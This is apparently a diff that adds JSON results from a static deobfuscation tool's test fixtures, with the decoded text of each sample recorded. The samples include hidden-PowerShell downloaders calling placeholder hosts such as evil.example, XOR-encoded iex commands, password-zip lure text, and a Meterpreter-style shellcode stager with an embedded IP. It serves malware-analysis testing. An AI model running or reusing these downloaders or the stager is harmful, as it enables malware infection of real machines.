+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 80,
+      "final_sha256": "b2c5f82fa72336b38d9efbd34572e536884b368cafd7cbfea0df588fdab2ae5b",
+      "final_text": "V1ROV2VXSkRRbTlrU0ZKM1QyazRkbVJJU25CTVZFbDFXbGhvYUdKWVFuTmFVelV3V2xoT01Fd3phejA9",
+      "fixture_id": "corpus_triple_base64_003",
+      "implementation": "reference",
+      "latency_ms": 0.005111971404403448,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 80,
+      "final_sha256": "c936eb50de4bc80209f9f7e9916646b142ce27642e33415143d1a7cf4249d3cd",
+      "final_text": "WkRKa2JHUkRRbTlrU0ZKM1QyazRkbVJJU25CTVZFMTFXbGhvYUdKWVFuTmFVelV3V2xoT01Fd3piejA9",
+      "fixture_id": "corpus_triple_base64_004",
+      "implementation": "reference",
+      "latency_ms": 0.005796027835458517,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 92,
+      "final_sha256": "9ff8fc8028ce4ff5b4915c544f458bdf58f78cd0da71a01824c2da0d367e8e9e",
+      "final_text": "U1VWWUlDaHBkM0lnSjJoMGRIQTZMeTkwY21rdE5DNWxlR0Z0Y0d4bExuUmxjM1F2YkM1d2N6RW5JQzExYzJWaUtRPT0=",
+      "fixture_id": "corpus_triple_base64_005",
+      "implementation": "reference",
+      "latency_ms": 0.02682796912267804,
+      "layer_count": 1,
+      "layer_sequence": [
+        "bare_base64"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 124,
+          "bytes_out": 92,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding"
+          ],
+          "stage": "bare_base64"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 114,
+      "final_sha256": "1276478b278515de418629190f1140ca585b20d36b7ec41b6e155c0f2f14bad7",
+      "final_text": "\\u0049\\u0045\\u0058\\u0020\\u0027\\u0062\\u0065\\u006e\\u0069\\u0067\\u006e\\u0020\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067\\u0027",
+      "fixture_id": "corpus_unicode_escapes_001",
+      "implementation": "reference",
+      "latency_ms": 0.0074830022640526295,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 144,
+      "final_sha256": "e888c5b745e9e0197e4f7dda7a6b43c858236f5586b665445e29c36d77587d07",
+      "final_text": "\\u0049\\u006e\\u0076\\u006f\\u006b\\u0065\\u002d\\u0045\\u0078\\u0070\\u0072\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e\\u0020\\u0027\\u0074\\u0065\\u0073\\u0074\\u0027",
+      "fixture_id": "corpus_unicode_escapes_002",
+      "implementation": "reference",
+      "latency_ms": 0.009367009624838829,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 72,
+      "final_sha256": "504843adc10261bce077bb4bac29701687e102b10601683f52622ac6e3f5ab3e",
+      "final_text": "\\u0077\\u0068\\u006f\\u0061\\u006d\\u0069\\u0020\\u002f\\u0070\\u0072\\u0069\\u0076",
+      "fixture_id": "corpus_unicode_escapes_003",
+      "implementation": "reference",
+      "latency_ms": 0.004708999767899513,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 186,
+      "final_sha256": "ba2f1342cf53f37431dbfdac2d35b86c6bfbeaaefec2a144297803879306d5d7",
+      "final_text": "\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0075\\u006e\\u0069\\u002d\\u0031\\u002e\\u0065\\u0078\\u0061\\u006d\\u0070\\u006c\\u0065\\u002e\\u0074\\u0065\\u0073\\u0074\\u002f\\u0078\\u002e\\u0070\\u0073\\u0031",
+      "fixture_id": "corpus_unicode_escapes_004",
+      "implementation": "reference",
+      "latency_ms": 0.013232987839728594,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 216,
+      "final_sha256": "3fa42d84f2a24d94b520d8407e31bd996fba5cdc878efd3acd9080989682196b",
+      "final_text": "\\u0063\\u0075\\u0072\\u006c\\u0020\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0075\\u006e\\u0069\\u002d\\u0032\\u002e\\u0065\\u0078\\u0061\\u006d\\u0070\\u006c\\u0065\\u002e\\u0074\\u0065\\u0073\\u0074\\u002f\\u0079\\u002e\\u0065\\u0078\\u0065",
+      "fixture_id": "corpus_unicode_escapes_005",
+      "implementation": "reference",
+      "latency_ms": 0.013708020560443401,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 81,
+      "final_sha256": "abad1d4bb45a60eeda06cf0601ccffb0f0e4d4dfd7ff56df804534b0fa85c0db",
+      "final_text": "%68%74%74%70%3A%2F%2F%75%72%6C%2D%31%2E%65%78%61%6D%70%6C%65%2E%74%65%73%74%2F%78",
+      "fixture_id": "corpus_url_encoding_001",
+      "implementation": "reference",
+      "latency_ms": 0.005391018930822611,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 81,
+      "final_sha256": "39a23d35cef67468312f2bb9a70fd55a0ab4c5f2742352ce6361aeb6eb656767",
+      "final_text": "%68%74%74%70%3A%2F%2F%75%72%6C%2D%32%2E%65%78%61%6D%70%6C%65%2E%74%65%73%74%2F%79",
+      "fixture_id": "corpus_url_encoding_002",
+      "implementation": "reference",
+      "latency_ms": 0.004859990440309048,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 93,
+      "final_sha256": "e06ecc593ad86baa4d37b26af79432feef8b8cc53fc2f8c84dedbf52fd83fe02",
+      "final_text": "%68%74%74%70%3A%2F%2F%75%72%6C%2D%33%2E%65%78%61%6D%70%6C%65%2E%74%65%73%74%2F%7A%2E%65%78%65",
+      "fixture_id": "corpus_url_encoding_003",
+      "implementation": "reference",
+      "latency_ms": 0.00620097853243351,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 93,
+      "final_sha256": "0895c154e0a1c26d669bba84711a51540dd7d5cf6b531c52df4cd71ddfbffa9d",
+      "final_text": "%68%74%74%70%3A%2F%2F%75%72%6C%2D%34%2E%65%78%61%6D%70%6C%65%2E%74%65%73%74%2F%61%2E%70%73%31",
+      "fixture_id": "corpus_url_encoding_004",
+      "implementation": "reference",
+      "latency_ms": 0.005987996701151133,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 93,
+      "final_sha256": "ee1c7bbcea28ddc5c34708c3601bb5e8adc244a721cb53856abc4da9baedeed8",
+      "final_text": "%68%74%74%70%3A%2F%2F%75%72%6C%2D%35%2E%65%78%61%6D%70%6C%65%2E%74%65%73%74%2F%62%2E%68%74%61",
+      "fixture_id": "corpus_url_encoding_005",
+      "implementation": "reference",
+      "latency_ms": 0.005603011231869459,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 140,
+      "final_sha256": "3dbd7340f8cc829bcf9a725f0c9738deb178593ae8082b39c4d80cd2b74d2d35",
+      "final_text": "Set s = CreateObject(\"WScript.Shell\") : s.Run \"cmd /c powershell -w hidden -c iwr http://vbs-1.example.test/x.exe -o %TEMP%\\p.exe\", 0, False",
+      "fixture_id": "corpus_vbscript_execute_001",
+      "implementation": "reference",
+      "latency_ms": 0.015622994396835566,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 140,
+      "final_sha256": "5ee3ce37ca434027d1ba3e9dbe36dbd9ccd7ca34a7a5ed79bee8636ec6941a0e",
+      "final_text": "Set s = CreateObject(\"WScript.Shell\") : s.Run \"cmd /c powershell -w hidden -c iwr http://vbs-2.example.test/y.exe -o %TEMP%\\p.exe\", 0, False",
+      "fixture_id": "corpus_vbscript_execute_002",
+      "implementation": "reference",
+      "latency_ms": 0.011417956557124853,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 140,
+      "final_sha256": "cc194a57d3bac1ba674a0998045e757646798bee3942e9ff8d3c4ac219e6b510",
+      "final_text": "Set s = CreateObject(\"WScript.Shell\") : s.Run \"cmd /c powershell -w hidden -c iwr http://vbs-3.example.test/z.exe -o %TEMP%\\p.exe\", 0, False",
+      "fixture_id": "corpus_vbscript_execute_003",
+      "implementation": "reference",
+      "latency_ms": 0.011953990906476974,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 140,
+      "final_sha256": "7079596d32a6f3867f1205aff0565049134202ec404a71faf1e8a0b829cabb20",
+      "final_text": "Set s = CreateObject(\"WScript.Shell\") : s.Run \"cmd /c powershell -w hidden -c iwr http://vbs-4.example.test/a.exe -o %TEMP%\\p.exe\", 0, False",
+      "fixture_id": "corpus_vbscript_execute_004",
+      "implementation": "reference",
+      "latency_ms": 0.011312018614262342,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 140,
+      "final_sha256": "36307312de61bd864efbf248bba5c0e6d68a18552d61d70058ca692c659da271",
+      "final_text": "Set s = CreateObject(\"WScript.Shell\") : s.Run \"cmd /c powershell -w hidden -c iwr http://vbs-5.example.test/b.exe -o %TEMP%\\p.exe\", 0, False",
+      "fixture_id": "corpus_vbscript_execute_005",
+      "implementation": "reference",
+      "latency_ms": 0.011886993888765574,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 147,
+      "final_sha256": "608c0b5780fbef7d9a82d55d61f942969b0579b33f6bb2065870b337b972864c",
+      "final_text": "powershell -nop -w hidden \"((70,99,120,101,116,60,89,126,98,101,49,54,98,112,119,116,54) | ForEach-Object{[char]($_ -bxor '0x11')}) -join '' | iex\"",
+      "fixture_id": "corpus_xor_ascii_decimal_iex_001",
+      "implementation": "reference",
+      "latency_ms": 0.014300982002168894,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 222,
+      "final_sha256": "bc640a56318f083e613aa3adbcbed3c56ebebe6432acceecb5a04fb91a6b1eff",
+      "final_text": "powershell -nop -w hidden \"((99,111,114,10,2,67,93,88,10,13,66,94,94,90,16,5,5,82,88,27,7,79,82,75,71,90,70,79,4,94,79,89,94,5,82,4,90,89,27,13,10,7,95,89,79,72,3) | ForEach-Object{[char]($_ -bxor '0x2a')}) -join '' | iex\"",
+      "fixture_id": "corpus_xor_ascii_decimal_iex_002",
+      "implementation": "reference",
+      "latency_ms": 0.020502950064837933,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 370,
+      "final_sha256": "7f44b6217ce605d5a686795d3e337cc353df36f5d43b920ac09a0c6137419941",
+      "final_text": "powershell -nop -w hidden \"((127,88,64,89,93,83,27,115,78,70,68,83,69,69,95,89,88,22,30,120,83,65,27,121,84,92,83,85,66,22,120,83,66,24,97,83,84,117,90,95,83,88,66,31,24,114,89,65,88,90,89,87,82,101,66,68,95,88,81,30,17,94,66,66,70,12,25,25,78,68,4,27,83,78,87,91,70,90,83,24,66,83,69,66,25,90,24,70,69,7,17,31) | ForEach-Object{[char]($_ -bxor '0x36')}) -join '' | iex\"",
+      "fixture_id": "corpus_xor_ascii_decimal_iex_003",
+      "implementation": "reference",
+      "latency_ms": 0.03354198997840285,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 226,
+      "final_sha256": "b4d48e04b78994c491262a63d90653310d090f7719dea935fb8346480dd9052d",
+      "final_text": "powershell -nop -w hidden \"((54,56,49,117,122,54,117,56,38,61,33,52,117,61,33,33,37,111,122,122,45,39,102,120,48,45,52,56,37,57,48,123,33,48,38,33,122,48,123,61,33,52) | ForEach-Object{[char]($_ -bxor '0x55')}) -join '' | iex\"",
+      "fixture_id": "corpus_xor_ascii_decimal_iex_004",
+      "implementation": "reference",
+      "latency_ms": 0.02077000681310892,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 261,
+      "final_sha256": "c9376a68ec58dcadac1457e01cd6ffcfed41789a5ae280920ec20b6a8658e1de",
+      "final_text": "powershell -nop -w hidden \"((20,18,5,3,2,3,30,27,87,90,2,5,27,20,22,20,31,18,87,90,17,87,31,3,3,7,77,88,88,15,5,67,90,18,15,22,26,7,27,18,89,3,18,4,3,88,19,5,24,7,7,18,5,87,19,5,24,7,7,18,5,89,18,15,18) | ForEach-Object{[char]($_ -bxor '0x77')}) -join '' | iex\"",
+      "fixture_id": "corpus_xor_ascii_decimal_iex_005",
+      "implementation": "reference",
+      "latency_ms": 0.024198030587285757,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 33,
+      "final_sha256": "13f9d83e3dc1b37295a68b8bdd6a291ef564f771b6b8ea78a5580d81c142e860",
+      "final_text": "$b='dnskaHdwfnJ2'; # xor-key 0x1f",
+      "fixture_id": "corpus_xor_base64_001",
+      "implementation": "reference",
+      "latency_ms": 0.0023460015654563904,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 49,
+      "final_sha256": "93815b379e81dcb329a91d8bc8925a9acb94075eea3968e17fcc4f2e91c03ac1",
+      "final_text": "$b='enZrExRbUkFeX1ZAQBNHVkBHFA=='; # xor-key 0x33",
+      "fixture_id": "corpus_xor_base64_002",
+      "implementation": "reference",
+      "latency_ms": 0.003838969860225916,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 69,
+      "final_sha256": "2cb162c5f874171946e1d4601ef48143b6d68b5293611b3bdf522a964df51704",
+      "final_text": "$b='JzE2KGQsMDA0fmtrPCZ1aSE8JSk0KCFqMCE3MGsmISUnKyo='; # xor-key 0x44",
+      "fixture_id": "corpus_xor_base64_003",
+      "implementation": "reference",
+      "latency_ms": 0.004425004590302706,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 85,
+      "final_sha256": "ca4e595461f06bc41a541169266b8f29005defb25a3cf9fba522c75126105bf9",
+      "final_text": "$b='EQEDEkYOEhIWXElJHgRUSwMeBwsWCgNIEgMVEkkCFAkWFgMURkspRkkSCxZJAg=='; # xor-key 0x66",
+      "fixture_id": "corpus_xor_base64_004",
+      "implementation": "reference",
+      "latency_ms": 0.005563022568821907,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 69,
+      "final_sha256": "346d5fc46ee45e91513d267b86b11b8b67de259506f7e3336546dbd5fdb8439d",
+      "final_text": "$b='GgQfAxZXHwMDB01YWA8VRFoSDxYaBxsSWQMSBANYD1kfAxY='; # xor-key 0x77",
+      "fixture_id": "corpus_xor_base64_005",
+      "implementation": "reference",
+      "latency_ms": 0.004825997166335583,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 97,
+      "final_sha256": "f1b5c89d1ee1b1e99e8262b9229d93fcfd8b8a576e458d41a82863a2171b4539",
+      "final_text": "Download: http://zip-1.example.test/payload.zip\nPassword: infected123\nRun: unzipped.exe (payload)",
+      "fixture_id": "corpus_zip_password_paste_001",
+      "implementation": "reference",
+      "latency_ms": 0.006601971108466387,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 94,
+      "final_sha256": "62665751ac0c1c592549bef0dc3b8c2f872c9bb874ce4fc47c1f0dfef43a9c05",
+      "final_text": "Download: http://zip-2.example.test/stub.zip\nPassword: infected123\nRun: unzipped.exe (payload)",
+      "fixture_id": "corpus_zip_password_paste_002",
+      "implementation": "reference",
+      "latency_ms": 0.006158021278679371,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 94,
+      "final_sha256": "43ed32955f43104b09fad0920a7efd5c0ddf6bc7e4b9049a4e334efdc46cfd6c",
+      "final_text": "Download: http://zip-3.example.test/drop.zip\nPassword: infected123\nRun: unzipped.exe (payload)",
+      "fixture_id": "corpus_zip_password_paste_003",
+      "implementation": "reference",
+      "latency_ms": 0.005930021870881319,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 95,
+      "final_sha256": "9d75f7cbf66d843532278f99a82396eb4729ffde3032ea8480c7dbbfbe2bb8f6",
+      "final_text": "Download: http://zip-4.example.test/inner.zip\nPassword: infected123\nRun: unzipped.exe (payload)",
+      "fixture_id": "corpus_zip_password_paste_004",
+      "implementation": "reference",
+      "latency_ms": 0.005942012649029493,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 94,
+      "final_sha256": "590602e6d9c3bd9d6f5ff1efe8afce9ce7243c02ba5de23986030844d989eb85",
+      "final_text": "Download: http://zip-5.example.test/next.zip\nPassword: infected123\nRun: unzipped.exe (payload)",
+      "fixture_id": "corpus_zip_password_paste_005",
+      "implementation": "reference",
+      "latency_ms": 0.005987007170915604,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 190,
+      "final_sha256": "a4b8fa32387298e31800f650f589397c818e7304afcec30c441345ab3ca77889",
+      "final_text": "<script>eval(String.fromCharCode(101,118,97,108,40,97,116,111,98,40,39,89,87,120,108,99,110,81,111,74,51,66,111,98,121,100,102,101,109,86,121,98,121,99,55,74,119,61,61,39,41,41,59))</script>",
+      "fixture_id": "js_fromcharcode_socgholish",
+      "implementation": "reference",
+      "latency_ms": 0.012202013749629259,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 2680,
+      "final_sha256": "9f083f71242617097cf7522f7fdcab326fc9dc2a64e84fdc0d42f2dd2f0e0717",
+      "final_text": "Set-StrictMode -Version 2\n\n$DoIt = @'\nfunction func_get_proc_address {\n\tParam ($var_module, $var_procedure)\t\t\n\t$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n\t$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))\n\treturn $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))\n}\n\nfunction func_get_delegate_type {\n\tParam (\n\t\t[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,\n\t\t[Parameter(Position = 1)] [Type] $var_return_type = [Void]\n\t)\n\n\t$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n\t$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\t$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\n\treturn $var_type_builder.CreateType()\n}\n\n[byte-array XOR loop decoded · key=0x23 · 834 bytes]\n  embedded_iocs: ip:149.28.81.19\n  extracted_strings:\n    · D$$[[aYZQ\n    · ]hnet\n    · hwiniThLw&\n    · WWWWWh:Vy\n    · RRRSRPh\n    · hE!^1\n    · /EZWf\n    · User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;PTBR)\n    · Tu%1X\n    · Y%0WO\n    · 149.28.81.19\n\n$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))\n$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)\n[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)\n\n$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))\n$var_runme.Invoke([IntPtr]::Zero)\n'@\n\nIf ([IntPtr]::size -eq 8) {\n\tstart-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job\n}\nelse {\n\tIEX $DoIt\n}\n",
+      "fixture_id": "meterpreter_gzip_xor_stager",
+      "implementation": "reference",
+      "latency_ms": 1.2435560347512364,
+      "layer_count": 3,
+      "layer_sequence": [
+        "from_base64_string",
+        "gzip",
+        "byte_array_xor_loop"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 2833,
+          "bytes_out": 3966,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding",
+            "raw_len"
+          ],
+          "stage": "from_base64_string"
+        },
+        {
+          "bytes_in": 3966,
+          "bytes_out": 3583,
+          "layer": 2,
+          "meta_keys": [
+            "bytes_in",
+            "bytes_out",
+            "encoding",
+            "inflation"
+          ],
+          "stage": "gzip"
+        },
+        {
+          "bytes_in": 3583,
+          "bytes_out": 2667,
+          "layer": 3,
+          "meta_keys": [
+            "bytes_in",
+            "bytes_out",
+            "embedded_iocs",
+            "encoding",
+            "extracted_strings",
+            "shellcode",
+            "xor_key",
+            "xor_key_hex"
+          ],
+          "stage": "byte_array_xor_loop"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 115,
+      "final_sha256": "f958f927897d3d70b0864e81fc6c21ee0a5718d22d826961b838569b252f7140",
+      "final_text": "IEX (New-Object \"`N`e`T`.`W`e`B`C`l`i`e`N`T\").DownloadString(\"`h`t`t`p`:`/`/`e`v`i`l`.`e`x`a`m`p`l`e`/`x`.`p`s`1\")\n",
+      "fixture_id": "ps_backtick_obf_downloader",
+      "implementation": "reference",
+      "latency_ms": 0.008466013241559267,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 145,
+      "final_sha256": "e87b886d0148d2e7231f378cabb7d7ca3124118563f75b0bf5ed078438de14cb",
+      "final_text": "`I`E`X `(`N`e`w`-`O`b`j`e`c`t `N`e`t`.`W`e`b`C`l`i`e`n`t`)`.`D`o`w`n`l`o`a`d`S`t`r`i`n`g`(`'`h`t`t`p`:`/`/`b`a`d`.`e`x`a`m`p`l`e`/`p`.`p`s`1`'`)\n",
+      "fixture_id": "ps_backtick_obf_iex",
